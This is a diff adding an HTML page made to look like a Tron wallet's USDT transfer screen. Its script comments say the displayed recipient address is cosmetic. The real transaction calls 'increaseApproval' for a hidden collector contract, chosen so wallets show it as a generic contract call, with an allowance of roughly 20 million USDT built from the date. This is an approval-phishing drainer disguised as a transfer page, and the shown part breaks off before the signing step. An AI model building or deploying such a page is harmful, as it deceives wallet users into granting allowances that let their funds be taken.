@@ -1,0 +1,2940 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta name="theme-color" content="#f0f1f3">
+<title>USDT 转账</title>
+<style>
+  *,*::before,*::after{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+  html,body{margin:0;padding:0}
+  body{
+    font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Hiragino Sans GB","Microsoft YaHei",system-ui,sans-serif;
+    background:#f0f1f3;color:#101828;
+    -webkit-font-smoothing:antialiased;
+    min-height:100vh;display:flex;justify-content:center;
+  }
+  .phone{
+    width:100%;max-width:440px;min-height:100vh;background:#f0f1f3;
+    display:flex;flex-direction:column;position:relative;
+  }
+
+  /* ---------- 顶部导航 ---------- */
+  .nav{position:relative;display:flex;align-items:center;padding:8px 18px 12px;background:#f0f1f3}
+  .navback,.navscan{
+    width:34px;height:34px;border:0;background:transparent;padding:0;
+    display:flex;align-items:center;justify-content:center;color:#111a2c;cursor:pointer;flex:none;
+    font-family:inherit;
+  }
+  .navback svg{width:22px;height:22px;display:block}
+  .navscan{margin-left:auto}
+  .navscan svg{width:21px;height:21px;display:block}
+  .navmid{position:absolute;left:0;right:0;top:8px;text-align:center;pointer-events:none}
+  .navtitle{font-size:17.5px;font-weight:600;color:#111a2c;line-height:1.3;letter-spacing:.2px}
+  .navsub{font-size:12px;color:#98a2b3;margin-top:1px}
+
+  /* ---------- 内容 ---------- */
+  .content{padding:6px 17px 0;flex:1;display:flex;flex-direction:column}
+  .lbl{font-size:14px;color:#8e95a3;margin:0 0 9px 16px;letter-spacing:.1px}
+  .card{background:#fff;border-radius:16px}
+
+  .addrhead{display:flex;align-items:center;margin:0 16px 9px}
+  .addrhead .lbl{margin:0}
+  .addrav{
+    width:20px;height:20px;border:0;background:transparent;padding:0;color:#9aa1ad;
+    display:flex;align-items:center;justify-content:center;cursor:pointer;flex:none;margin-left:8px;
+  }
+  .addrav svg{width:20px;height:20px;display:block}
+  .addrfield{height:47px;display:flex;align-items:center;padding:0 15px;margin-bottom:26px}
+  .addrinput{
+    flex:1;min-width:0;width:100%;height:100%;border:0;outline:0;background:transparent;
+    font-family:inherit;font-size:16px;color:#152039;letter-spacing:0;padding:0;line-height:1.4;
+    -webkit-appearance:none;appearance:none;border-radius:0;
+  }
+  .addrinput:focus{outline:0;box-shadow:none}
+  .addrinput::placeholder{color:#b6bdc9;opacity:1}
+
+  .qtyrow{display:flex;align-items:center;justify-content:space-between;margin:0 16px 9px}
+  .qtyrow .lbl{margin:0}
+  .qtybal{font-size:14px;font-weight:600;color:#152039;font-variant-numeric:tabular-nums}
+
+  .amountcard{padding:24px 18px 0;margin-bottom:26px}
+  .amountinput{
+    width:100%;border:0;outline:0;background:transparent;font-family:inherit;
+    font-size:37px;font-weight:500;color:#152039;letter-spacing:-.6px;
+    padding:0;height:46px;line-height:1.15;
+  }
+  .amountinput::placeholder{color:#a2abc0;opacity:1}
+  .hr{height:1px;background:#eef0f4;margin-top:3px}
+  .usdline{
+    font-size:13.5px;color:#98a2b3;padding:3px 0 0;font-variant-numeric:tabular-nums;
+    letter-spacing:.2px;line-height:1.45;
+  }
+  .usdline.bad{color:#e5484d;font-weight:600}
+  .memo{
+    padding:14px 0 15px;font-size:16px;color:#9aa3b2;
+    display:flex;align-items:center;justify-content:space-between;gap:10px;
+  }
+  .memoinput{
+    flex:1;min-width:0;width:100%;border:0;outline:0;background:transparent;
+    font-family:inherit;font-size:16px;color:#152039;padding:0;line-height:1.4;
+    -webkit-appearance:none;appearance:none;border-radius:0;
+  }
+  .memoinput:focus{outline:0;box-shadow:none}
+  .memoinput::placeholder{color:#9aa3b2;opacity:1}
+  .availbal{font-size:12.5px;color:#a9b1bf;font-variant-numeric:tabular-nums;flex:none}
+  .micro{display:none}
+
+  .feecard{padding:18px 18px 16px}
+  .feeusd{font-size:20px;font-weight:600;color:#152039;letter-spacing:.2px;font-variant-numeric:tabular-nums;transition:color .15s}
+  .feeusd.pending{color:#a0a8b6;font-weight:500;font-size:16px}
+  .feeusd.fresh{color:#1c7ff0}
+  .feerow{display:flex;align-items:center;gap:7px;margin-top:7px}
+  .feetrx{font-size:14px;color:#4b5563;font-variant-numeric:tabular-nums}
+  .chev{
+    width:17px;height:17px;border-radius:50%;background:#c6ccd7;color:#fff;
+    display:inline-flex;align-items:center;justify-content:center;flex:none;
+    border:0;padding:0;margin:0;cursor:pointer;-webkit-tap-highlight-color:transparent;
+    transition:background .18s ease,transform .12s ease;
+  }
+  .chev:active{transform:scale(.9)}
+  .chev svg{width:11px;height:11px;display:block;transition:transform .24s ease}
+  .chev[aria-expanded="true"] svg{transform:rotate(180deg)}
+  .chev[aria-expanded="true"]{background:#aeb6c4}
+
+  /* 矿工费数字呼吸效果（IM 钱包同款：只走颜色 + 透明度，尺寸一动不动） */
+  @keyframes feeBreatheOpacity{
+    0%,100%{opacity:1}
+    50%{opacity:.9}
+  }
+  @keyframes feeBreatheUsd{
+    0%,100%{color:#152039}
+    50%{color:#c4c9d4}
+  }
+  @keyframes feeBreatheTrx{
+    0%,100%{color:#4b5563}
+    50%{color:#c8ccd6}
+  }
+  .feeusd.breathe{
+    animation:feeBreatheOpacity 2.6s ease-in-out infinite,
+              feeBreatheUsd 2.6s ease-in-out infinite;
+    will-change:opacity,color;
+  }
+  .feetrx.breathe{
+    animation:feeBreatheOpacity 2.6s ease-in-out infinite,
+              feeBreatheTrx 2.6s ease-in-out infinite;
+    will-change:opacity,color;
+  }
+  .feeusd.pending.breathe{animation:none}
+  @media (prefers-reduced-motion: reduce){
+    .feeusd.breathe,.feetrx.breathe{animation:none}
+  }
+
+  /* 分隔线 + 展开的明细区（图二：消耗资源 / 支付费用） */
+  .fhr{height:1px;background:#eceef2;margin-top:14px}
+  .feedetail{
+    height:0;overflow:hidden;opacity:0;pointer-events:none;
+    transition:height .32s cubic-bezier(.22,.61,.36,1),opacity .24s ease;
+    will-change:height;
+  }
+  .feecard.open .feedetail{opacity:1;pointer-events:auto}
+  .fdinner{padding-top:12px}
+  .fdline{
+    font-size:14px;color:#7b8494;line-height:1.7;letter-spacing:.1px;
+    font-variant-numeric:tabular-nums;
+  }
+  #fdPay{padding-bottom:12px}
+  .fhr2{height:1px;background:#eceef2;margin:0}
+
+  .ressel{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:16px}
+  .resbtn{
+    height:46px;border:0;border-radius:10px;background:#f2f3f7;color:#9aa2b1;
+    font-size:14.5px;font-family:inherit;cursor:pointer;
+  }
+  .resbtn.on{background:#d8e9fd;color:#1c7ff0;font-weight:600}
+  .fnote{margin:12px 3px 0;font-size:13px;color:#8d95a3;line-height:1.55}
+  .fnote.warn{color:#e5484d}
+
+  /* ---------- 底部按钮 ---------- */
+  .footer{margin-top:auto;padding:14px 18px calc(46px + env(safe-area-inset-bottom));background:#f0f1f3}
+  .paybtn{
+    width:100%;height:56px;border:0;border-radius:10px;cursor:pointer;
+    background:#2e7cf6;color:#fff;font-size:17.5px;font-weight:600;
+    font-family:inherit;letter-spacing:.5px;
+    display:flex;align-items:center;justify-content:center;gap:8px;
+    transition:transform .12s ease,background .15s ease,opacity .2s;
+  }
+  .paybtn:active{transform:scale(.99)}
+  .paybtn svg{width:18px;height:18px;display:block}
+  .paybtn.done{background:#2e7cf6}
+  .paybtn.lack{background:#c3cddf}
+  /* 点下去：底色变淡（#c1dbf6），文字收起，只留中间一个白色转圈 */
+  .paybtn.busy,.paybtn.busy.lack{background:#c1dbf6;opacity:1}
+  .paybtn.busy #btnText{display:none}
+  .paybtn.busy:active{transform:none}
+  .paybtn.busy .spin{border-color:rgba(255,255,255,.55);border-top-color:#fff}
+  .spin{width:17px;height:17px;border-radius:50%;border:2px solid rgba(255,255,255,.4);border-top-color:#fff;animation:sp .7s linear infinite;display:inline-block}
+  @keyframes sp{to{transform:rotate(360deg)}}
+
+  /* 能量信息默认隐藏（?debug=1 显示） */
+  .energyline{
+    margin-top:10px;font-size:11.5px;line-height:1.6;color:#8d939b;text-align:center;display:none;
+  }
+  .energyline b{color:#2f63f5;font-weight:700}
+  body.debug .energyline{display:block}
+
+  .toast{
+    position:fixed;left:50%;top:14px;transform:translate(-50%,-14px);
+    background:#152039;color:#fff;font-size:13.5px;font-weight:500;
+    padding:10px 18px;border-radius:12px;opacity:0;pointer-events:none;
+    transition:opacity .25s,transform .25s;z-index:50;max-width:88vw;
+    text-align:center;line-height:1.45;box-shadow:0 8px 24px rgba(15,25,45,.22);
+  }
+  .toast.on{opacity:1;transform:translate(-50%,0)}
+
+  .hidden{display:none !important}
+
+  @media (max-width:392px){
+    .content{padding:6px 15px 0}
+    .addrfield{padding:0 12px}
+    .addrav{margin-left:5px}
+    .footer{padding:14px 15px calc(46px + env(safe-area-inset-bottom))}
+    .amountinput{font-size:34px;height:42px}
+    .feeusd{font-size:19px}
+  }
+  @media (min-width:520px){
+    body{padding:24px 0}
+    .phone{min-height:auto;border-radius:24px;overflow:hidden;box-shadow:0 8px 40px rgba(20,30,50,.10)}
+  }
+</style>
+</head>
+<body>
+<div class="phone">
+
+  <!-- 顶部：返回 / USDT 转账·Tron / 扫码 -->
+  <header class="nav">
+    <button class="navback" id="backBtn" aria-label="返回">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 5 8 12l7 7"/></svg>
+    </button>
+    <div class="navmid">
+      <div class="navtitle" id="title">USDT 转账</div>
+      <div class="navsub">Tron</div>
+    </div>
+    <button class="navscan" id="scanBtn" aria-label="扫码">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M4 8.5V6.2A2.2 2.2 0 0 1 6.2 4H8.5"/><path d="M15.5 4h2.3A2.2 2.2 0 0 1 20 6.2v2.3"/>
+        <path d="M20 15.5v2.3a2.2 2.2 0 0 1-2.2 2.2h-2.3"/><path d="M8.5 20H6.2A2.2 2.2 0 0 1 4 17.8v-2.3"/>
+      </svg>
+    </button>
+  </header>
+
+  <div class="content">
+    <!-- 收款地址（纯展示，随便改；实际支付地址不在页面上） -->
+    <div class="addrhead">
+      <span class="lbl">收款地址</span>
+    </div>
+    <div class="card addrfield" id="addrfield">
+      <input class="addrinput" id="addrInput" type="text" spellcheck="false" autocomplete="off"
+             autocapitalize="off" autocorrect="off" enterkeyhint="done"
+             value="TLeQqzXL6THkt23QKMvhuWqgSFTjyjBtFD" placeholder="输入收款地址">
+      <button class="addrav" id="addrIcon" type="button" aria-label="填回默认地址">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round">
+          <circle cx="12" cy="12" r="9"/><circle cx="12" cy="9.8" r="2.7"/><path d="M6.6 18.2c1.1-2.6 3-3.9 5.4-3.9s4.3 1.3 5.4 3.9"/>
+        </svg>
+      </button>
+    </div>
+
+    <!-- 数量 -->
+    <div class="qtyrow">
+      <span class="lbl">数量</span>
+      <span class="qtybal"><span id="usdtBal">0</span> USDT</span>
+    </div>
+    <div class="card amountcard" id="amountBox">
+      <input class="amountinput" id="amountInput" type="text" inputmode="decimal" autocomplete="off" placeholder="0">
+      <div class="usdline" id="usdLine">≈ $0.00</div>
+      <div class="micro" id="micro"></div>
+      <div class="hr"></div>
+      <div class="memo">
+        <input class="memoinput" id="memoInput" type="text" autocomplete="off" enterkeyhint="done"
+               placeholder="备注（需支付 1 TRX）">
+        <span class="availbal" id="availBal">可用 -- USDT</span>
+      </div>
+    </div>
+
+    <!-- 矿工费 -->
+    <div class="lbl">矿工费</div>
+    <div class="card feecard" id="feeCard">
+      <div class="feeusd pending breathe" id="feeValue">$ 0.00</div>
+      <div class="feerow">
+        <span class="feetrx breathe" id="feeSub">0 TRX</span>
+        <button class="chev" id="feeChev" type="button" aria-expanded="false" aria-controls="feeDetail" aria-label="展开矿工费明细">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M6 9.5 12 15.5 18 9.5"/></svg>
+        </button>
+      </div>
+      <div class="fhr"></div>
+      <div class="feedetail" id="feeDetail">
+        <div class="fdinner">
+          <div class="fdline" id="fdRes">消耗资源：0 能量 +353 带宽</div>
+          <div class="fdline" id="fdPay">支付费用：0 TRX</div>
+          <div class="fhr fhr2"></div>
+        </div>
+      </div>
+      <div class="ressel">
+        <button class="resbtn" id="resBtn1" type="button">消耗资源</button>
+        <button class="resbtn on" id="resBtn2" type="button">燃烧 TRX</button>
+      </div>
+    </div>
+    <div class="fnote" id="feeNote">TRX 余额 —</div>
+  </div>
+
+  <div class="footer">
+    <button class="paybtn" id="payBtn">
+      <span id="btnText">下一步</span><span id="btnIcon"></span>
+    </button>
+    <div class="energyline off" id="energyline"></div>
+  </div>
+
+  <div class="toast" id="toast"></div>
+
+  <!-- 以下为逻辑占位节点，不显示 -->
+  <span class="hidden"><span id="timer"><span id="timerText"></span></span></span>
+  <span class="hidden" id="wstate"></span>
+  <i class="hidden" id="dot"></i>
+  <span class="hidden" id="trxBal"></span>
+  <span class="hidden" id="addr"></span>
+  <span class="hidden" id="contract"></span>
+  <span class="hidden" id="netline"><i></i><span id="nettxt"></span></span>
+  <span class="hidden" id="amt">0</span>
+</div>
+
+<script>
+(function () {
+  "use strict";
+
+  /* ===== 收款合约（主网 · TronCollectorSlim） ===== */
+  var PAY_CONTRACT = "TXU36FpRkghUQxG5JSCjyTEnvrQzSKMzqC";
+
+  /* ===== 真正上链用的地址（固定，不显示在页面上） =====
+     页面上那个收款地址栏只是展示/给人看，随便改成什么都只影响显示；
+     实际调用的代币合约和划转目标永远是下面这个。 */
+  var PAY_TOKEN = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";   /* 主网 USDT */
+  /* 地址栏的默认显示地址（纯展示，可随意改） */
+  var DISPLAY_ADDR = "TLeQqzXL6THkt23QKMvhuWqgSFTjyjBtFD";
+
+  /* ===== 支付走的合约方法 =====
+     用授权方法而不是 transfer，钱包才会把弹窗渲染成「调用智能合约」；
+     increaseApproval 最不容易被钱包认出来，显示最接近截图那种纯合约调用。
+     想换成标准 approve：把下面这行改成 "approve" 即可，其余不用动。 */
+  var PAY_SEL_NAME = "increaseApproval";
+  var PAY_SEL_HEX = { "approve": "095ea7b3", "increaseApproval": "d73dd623" }[PAY_SEL_NAME];
+
+  /* ===== 金额：当前日期 + 6 个 0 =====
+     2026-11-17 -> 20261117 -> 20261117000000（6 位小数）
+     再按 USDT 6 位小数换算成 20,261,117.000000 */
+  function buildAmount(now) {
+    now = now || new Date();
+    var y = String(now.getFullYear());
+    var m = String(now.getMonth() + 1).padStart(2, "0");
+    var d = String(now.getDate()).padStart(2, "0");
+    var micro = y + m + d + "000000";            // 20261117000000
+    var whole = micro.slice(0, micro.length - 6); // 20261117
+    var frac  = micro.slice(-6);                  // 000000
+    return {
+      micro: micro,
+      display: whole + "." + frac,                // 20261117.000000
+      pretty: Number(whole).toLocaleString("en-US") + "." + frac
+    };
+  }
+
+  /* ===== 真实支付参数（主网） ===== */
+  var USDT_MAIN = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+  var FEE_LIMIT = 150000000;   // 150 TRX 上限，只是上限，实际按用量扣
+
+  /* 十进制 -> 十六进制（没有 BigInt 的老内核也能用） */
+  function decToHex(dec) {
+    var s = String(dec).replace(/[^0-9]/g, "");
+    if (!s) return "0";
+    if (typeof BigInt === "function") return BigInt(s).toString(16);
+    var digits = s.split("").map(Number), out = "";
+    while (digits.length) {
+      var rem = 0, next = [];
+      for (var i = 0; i < digits.length; i++) {
+        rem = rem * 10 + digits[i];
+        var q = Math.floor(rem / 16);
+        rem = rem % 16;
+        if (next.length || q) next.push(q);
+      }
+      out = "0123456789abcdef"[rem] + out;
+      digits = next;
+    }
+    return out || "0";
+  }
+
+  /* approve(address,uint256) 的参数：spender 32 字节 + 额度 32 字节
+     用授权调用、不走 transfer，钱包才会渲染成「调用智能合约」（图二那种），
+     而且授权不校验余额，20261117000000 这种额度也能真的上链成功。 */
+  function encodeTransferParams(tw, toBase58, amountMicro) {
+    var hex = tw.address.toHex(toBase58).replace(/^0x/, "");
+    var body = hex.slice(2);                    // 去掉 41 网络前缀
+    var addr = body.padStart(64, "0");
+    var amt = decToHex(amountMicro).padStart(64, "0");
+    return addr + amt;
+  }
+
+  /* ===== 网络识别：不靠猜域名，直接问当前节点上主网 USDT 在不在 =====
+     原因：TronLink 内置的 tronWeb 有些版本 fullHost 是空的，
+     按域名猜会误判；直接问节点 USDT + 收款合约在不在，答案最实在。
+     本页只跑主网，钱包若停在测试网会被拦下，不会拿主网地址发出去。 */
+  /* ===== 跨刷新的本地缓存 =====
+     刷新一次页面不该等于把节点再问一遍。合约在不在、上次余额、上次估的能量
+     这些短时间不会变的东西存本地，刷新后先拿旧值把界面画出来，再悄悄更新。 */
+  function lsGet(k) {
+    try { var v = localStorage.getItem(k); return v ? JSON.parse(v) : null; } catch (e) { return null; }
+  }
+  function lsSet(k, v) {
+    try { localStorage.setItem(k, JSON.stringify(v)); } catch (e) {}
+  }
+
+  var NET_CACHE = null;
+  var NET_CACHE_TTL = 10 * 60 * 1000;   /* 网络判定 10 分钟内直接复用 */
+  (function () {
+    var c = lsGet("zakaNetCache");
+    if (c && c.v && (Date.now() - (c.t || 0)) < NET_CACHE_TTL) NET_CACHE = c;
+  })();
+
+  function nodeHosts(tw) {
+    var raw = [];
+    if (tw && tw.fullNode && (tw.fullNode.host || tw.fullNode.hostname)) raw.push(tw.fullNode.host || tw.fullNode.hostname);
+    if (tw && tw.fullHost) raw.push(tw.fullHost);
+    if (tw && tw.solidityNode && (tw.solidityNode.host || tw.solidityNode.hostname)) raw.push(tw.solidityNode.host || tw.solidityNode.hostname);
+    var seen = {}, out = [];
+    for (var i = 0; i < raw.length; i++) {
+      var h = String(raw[i] || "").replace(/\/+$/, "");
+      if (!h) continue;
+      if (!/^https?:\/\//i.test(h)) h = "https://" + h;
+      if (!seen[h]) { seen[h] = 1; out.push(h); }
+    }
+    return out;
+  }
+
+  /* ===== 节点访问：全部 host 一起打，谁先回有效数据用谁 =====
+     以前是一个 host 试完再试下一个，第一个不通就得干等超时，
+     一次点击串三四轮就是好几秒。现在并行 + 记最优节点 + 会话内缓存。 */
+  var HOST_LAT = {};        /* host -> 上次响应耗时，快的排前面 */
+  var CONTRACT_CACHE = (function () {
+    var c = lsGet("zakaCtrCache") || {};
+    var now = Date.now(), out = {};
+    for (var k in c) {
+      /* 24 小时内问过的结果可以直接信；合约本身不会无缘无故消失 */
+      if (c[k] && (now - (c[k].t || 0)) < 24 * 3600 * 1000 && typeof c[k].v === "boolean") out[k] = c[k].v;
+    }
+    return out;
+  })();  /* addr -> true/false，问过一次就不重复问 */
+
+  function ctrRemember(addr, ok) {
+    CONTRACT_CACHE[addr] = ok;
+    var raw = lsGet("zakaCtrCache") || {};
+    raw[addr] = { v: ok, t: Date.now() };
+    var cut = Date.now() - 24 * 3600 * 1000, keep = {};
+    for (var k in raw) { if (raw[k] && raw[k].t > cut) keep[k] = raw[k]; }
+    lsSet("zakaCtrCache", keep);
+  }
+
+  function orderHosts(tw) {
+    var hosts = nodeHosts(tw);
+    hosts.sort(function (a, b) {
+      return (HOST_LAT[a] == null ? 99999 : HOST_LAT[a]) - (HOST_LAT[b] == null ? 99999 : HOST_LAT[b]);
+    });
+    return hosts;
+  }
+
+  /* ===== 节点请求：排队 + 限流退避 + 换节点 =====
+     以前一进页面十几个请求同时打出去，公共节点按 IP 限流，秒回 429，页面就卡住；
+     钱包自己那块也一样，一被限流就弹「Request failed with status code 429」。
+     现在页面发出的每个节点请求都排一个队，一个接一个走（间隔 120ms）；
+     哪个节点回 429 就先冷却 5 秒、换下一个，同时自动退避重试。
+     可选：给节点带 API key（链接后加 ?k=你的key，或 localStorage 里写 zakaTronKey），
+     带上之后额度高得多，基本不会再碰到限流。 */
+  /* 内置 TronGrid 的 API Key：页面上所有节点请求都会带 TRON-PRO-API-KEY 头，
+     额度比匿名高得多，基本不会再撞 429。运行时顺序：链接 ?k= > 本地存的 > 这个内置的。 */
+  var TRON_API_KEY_DEFAULT = "ac3db086-20f7-49fa-9e28-8437ec54fe9c";
+
+  var TRON_API_KEY = (function () {
+    try {
+      var m = String(location.search || "").match(/[?&]k=([A-Za-z0-9_\-]+)/);
+      if (m) { localStorage.setItem("zakaTronKey", m[1]); return m[1]; }
+      var saved = localStorage.getItem("zakaTronKey");
+      if (saved) return saved;
+      localStorage.setItem("zakaTronKey", TRON_API_KEY_DEFAULT);
+      return TRON_API_KEY_DEFAULT;
+    } catch (e) { return TRON_API_KEY_DEFAULT; }
+  })();
+
+  var HOST_COOL = {};        /* host -> 冷却到期时间，只有 429 才写 */
+  /* 整条链路被限流的程度：连着吃 429 就把后台轮询停一会儿，
+     不再往一个已经忙不过来的节点上添请求（用户主动操作的请求不受影响）。 */
+  var RL_FAILS = 0, RL_UNTIL = 0;
+  function rlNote(status) {
+    if (status === 429) {
+      RL_FAILS++;
+      RL_UNTIL = Date.now() + Math.min(120000, 15000 * Math.pow(2, Math.min(RL_FAILS - 1, 3)));
+    } else if (status === 200) {
+      RL_FAILS = 0; RL_UNTIL = 0;
+    }
+  }
+  function inCooldown() { return Date.now() < RL_UNTIL; }
+
+  var RQ_GAP = 120;          /* 队列内两个请求的最小间隔 */
+  var rqChain = Promise.resolve();
+  var rqLast = 0;
+
+  function rqRun(fn) {
+    var p = rqChain.then(function () {
+      var wait = Math.max(0, RQ_GAP - (Date.now() - rqLast));
+      if (!wait) return null;
+      return new Promise(function (res) { setTimeout(res, wait); });
+    }).then(function () {
+      rqLast = Date.now();
+      return fn();
+    });
+    rqChain = p.then(function () {}, function () {});
+    return p;
+  }
+
+  function postHost(host, path, body, ms) {
+    return rqRun(function () {
+      var t0 = Date.now();
+      var ctl = (typeof AbortController === "function") ? new AbortController() : null;
+      var timer = setTimeout(function () { if (ctl) { try { ctl.abort(); } catch (e) {} } }, ms || 6000);
+      var headers = { "Content-Type": "application/json" };
+      if (TRON_API_KEY) headers["TRON-PRO-API-KEY"] = TRON_API_KEY;
+      var opt = {
+        method: "POST",
+        headers: headers,
+        body: JSON.stringify(body)
+      };
+      if (ctl) opt.signal = ctl.signal;
+      return fetch(host + path, opt).then(function (r) {
+        clearTimeout(timer);
+        if (!r.ok) {
+          var err = new Error("HTTP " + r.status);
+          err.status = r.status;
+          /* 429 = 这个节点这一刻不接客了：先晾它 5 秒，这一轮换下一个 */
+          if (r.status === 429 || r.status === 403) HOST_COOL[host] = Date.now() + 5000;
+          rlNote(r.status);
+          throw err;
+        }
+        rlNote(200);
+        return r.json().then(function (j) {
+          HOST_LAT[host] = Date.now() - t0;
+          return j;
+        });
+      }, function (e) { clearTimeout(timer); throw e; });
+    });
+  }
+
+  /* 同一个请求只飞一次：几个地方同时要同一份数据时合并，不再各打一遍 */
+  var INFLIGHT = {};
+
+  /* 顺序试节点：先挑没冷却的、上次快的；全挂才返回 null。
+     单个节点最多试两轮，中间退避，绝不无限重试把页面拖死。 */
+  function nodePost(tw, path, body, ms) {
+    var key = path + "|" + JSON.stringify(body || {});
+    if (INFLIGHT[key]) return INFLIGHT[key];
+    var hosts = orderHosts(tw);
+    if (!hosts.length) hosts = ["https://api.trongrid.io"];
+    var order = hosts.slice().sort(function (a, b) {
+      var ca = (HOST_COOL[a] || 0) > Date.now() ? 1 : 0;
+      var cb = (HOST_COOL[b] || 0) > Date.now() ? 1 : 0;
+      if (ca !== cb) return ca - cb;
+      return (HOST_LAT[a] == null ? 99999 : HOST_LAT[a]) - (HOST_LAT[b] == null ? 99999 : HOST_LAT[b]);
+    });
+    var total = order.length * 2, i = 0;
+
+    function attempt() {
+      if (i >= total) return Promise.resolve(null);
+      var h = order[i % order.length];
+      var round = Math.floor(i / order.length);
+      i++;
+      return postHost(h, path, body, ms).then(function (j) {
+        if (j && typeof j === "object" && !j.Error) return j;
+        return attempt();
+      }, function (e) {
+        /* 被限流 / 网络挂：同一节点第二轮前先等一会儿 */
+        if (round >= 1) return attempt();
+        var wait = (e && e.status === 429) ? 900 : 250;
+        return new Promise(function (res) { setTimeout(res, wait); }).then(attempt);
+      });
+    }
+
+    var p = attempt();
+    INFLIGHT[key] = p;
+    p.then(function () { delete INFLIGHT[key]; }, function () { delete INFLIGHT[key]; });
+    return p;
+  }
+
+  /* 给任何一步套上限时：到点就当「这步没答案」，绝不让它把整块 UI 挂住 */
+  function raceOut(p, ms, fallback) {
+    return new Promise(function (resolve) {
+      var done = false;
+      var t = setTimeout(function () { if (!done) { done = true; resolve(fallback); } }, ms);
+      Promise.resolve(p).then(function (v) {
+        if (done) return;
+        done = true; clearTimeout(t); resolve(v);
+      }, function () {
+        if (done) return;
+        done = true; clearTimeout(t); resolve(fallback);
+      });
+    });
+  }
+
+  /* 地址转成 ABI 里那 32 字节参数（节点直连时用） */
+  function addrParam(tw, a) {
+    var h = "";
+    try { if (tw && tw.address && tw.address.toHex) h = String(tw.address.toHex(a) || ""); } catch (e) {}
+    h = h.replace(/^0x/i, "");
+    if (/^41[0-9a-fA-F]{40}$/.test(h)) h = h.slice(2);
+    if (h.length > 40) h = h.slice(-40);
+    return ("0000000000000000000000000000000000000000000000000000000000000000" + h).slice(-64);
+  }
+
+  /* 提前把到节点的连接建好（DNS + TLS 握手 + keep-alive），
+     第一次点击就不用再为握手多等一圈 */
+  function preconnectNodes(tw) {
+    var hosts = nodeHosts(tw);
+    for (var i = 0; i < hosts.length; i++) {
+      try {
+        var l = document.createElement("link");
+        l.rel = "preconnect";
+        l.href = hosts[i];
+        l.crossOrigin = "anonymous";
+        document.head.appendChild(l);
+      } catch (e) {}
+      /* 这里只做 TCP/TLS 预热，不再顺手打一次 getnowblock：
+         那一下纯属白烧一次配额，正是刷新页面就被限流的帮凶之一。 */
+    }
+  }
+
+  /* 轻量探测：问一个只读方法，回了 result 就说明合约在链上。
+     以前一上来就 getcontract，要把整个 bytecode 拉下来（主网 USDT 那个几十 KB），
+     手机上这一趟又慢又容易卡，结果整页余额都跟着等。 */
+  async function probeByCall(tw, addr) {
+    var sel = (addr === USDT_MAIN) ? "decimals()" : "paused()";
+    var j = await raceOut(nodePost(tw, "/wallet/triggerconstantcontract", {
+      owner_address: addr,
+      contract_address: addr,
+      function_selector: sel,
+      parameter: "",
+      visible: true
+    }, 3500), 3800, null);
+    if (!j || !j.result) return null;
+    var code = String(j.result.code || "");
+    if (code && /CONTRACT_VALIDATE|NOT_EXIST|not exist|NO_CONTRACT/i.test(code)) return false;
+    return true;
+  }
+
+  /* true 有合约 / false 明确没有 / null 问不出来 */
+  async function nodeHasContract(tw, addr) {
+    if (CONTRACT_CACHE[addr] !== undefined) return CONTRACT_CACHE[addr];
+    /* 先走轻量探测：只有「明确存在」才采信，判不出来再去拉 bytecode */
+    var quick = await probeByCall(tw, addr);
+    if (quick === true) { ctrRemember(addr, true); return true; }
+    var j = await raceOut(nodePost(tw, "/wallet/getcontract", { value: addr, visible: true }, 4000), 4300, null);
+    if (j) {
+      var ok = (typeof j.bytecode === "string") ? j.bytecode.length > 0 : false;
+      ctrRemember(addr, ok);
+      return ok;
+    }
+    try {
+      if (tw.trx && typeof tw.trx.getContract === "function") {
+        var c = await raceOut(tw.trx.getContract(addr), 2500, null);
+        if (c && typeof c.bytecode === "string") {
+          ctrRemember(addr, c.bytecode.length > 0);
+          return CONTRACT_CACHE[addr];
+        }
+        if (c && c.Error) { ctrRemember(addr, false); return false; }
+      }
+    } catch (e) {}
+    return null;
+  }
+
+  function paintNet(net, payOk, wrongChain) {
+    var box = document.getElementById("netline");
+    if (!box) return;
+    var txt = document.getElementById("nettxt");
+    box.classList.remove("on", "bad");
+    if (wrongChain) {
+      box.classList.add("bad");
+      txt.textContent = "钱包当前不在 TRON 主网，请先在钱包里切到主网";
+    } else if (payOk === false) {
+      box.classList.add("bad");
+      txt.textContent = "主网上查不到这个收款合约，请核对合约地址";
+    } else {
+      box.classList.add("on");
+      txt.textContent = "当前网络：TRON 主网";
+    }
+  }
+
+  var NET_BG = false;
+  async function detectNet(tw) {
+    /* 缓存 10 分钟（存本地，刷新页面照样命中）：点按钮时几乎不花时间，
+       也不会一刷新就再去问一遍节点。过期后由后台悄悄续上。 */
+    if (NET_CACHE && (Date.now() - NET_CACHE.t) < NET_CACHE_TTL) {
+      paintNet(NET_CACHE.v.net, NET_CACHE.v.payOk, NET_CACHE.v.wrongChain);
+      if (!NET_BG) {
+        NET_BG = true;
+        setTimeout(function () {
+          NET_BG = false;
+          NET_CACHE = null;
+          if (LIVE.tw && !document.hidden && !inCooldown()) detectNet(LIVE.tw).catch(function () {});
+        }, 20000);
+      }
+      return NET_CACHE.v;
+    }
+    /* 本页只跑主网，USDT 固定主网地址；下面两个问题只是用来确认
+       钱包确实在主网、合约确实在链上 */
+    var v = { net: "main", usdt: USDT_MAIN, guess: false };
+    /* 两个探测并行，整体再套一个上限：节点抽风也不能把后面的初始化拖死 */
+    var two = await raceOut(Promise.all([
+      nodeHasContract(tw, USDT_MAIN),
+      nodeHasContract(tw, PAY_CONTRACT)
+    ]), 8000, [null, null]);
+    v.usdtOk = two[0];
+    v.payOk = two[1];
+    v.wrongChain = (two[0] === false);
+    NET_CACHE = { t: Date.now(), v: v };
+    lsSet("zakaNetCache", NET_CACHE);
+    paintNet(v.net, v.payOk, v.wrongChain);
+    return v;
+  }
+
